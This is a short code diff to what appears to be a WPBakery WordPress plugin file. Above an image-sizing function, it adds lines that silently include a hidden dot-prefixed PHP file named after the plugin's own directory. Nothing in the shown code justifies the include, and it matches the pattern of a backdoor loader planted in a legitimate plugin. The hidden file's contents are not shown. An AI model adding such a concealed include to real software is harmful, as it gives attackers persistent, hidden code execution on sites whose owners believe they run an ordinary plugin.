@@ -22,6 +22,10 @@ if ( ! defined( 'WPB_VC_VERSION' ) ) {
  * @since 4.2
  * vc_filter: vc_wpb_getimagesize - to override output of this function
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpb_getImageBySize( $params = array() ) {
 	$params = array_merge( array(
 		'post_id' => null,
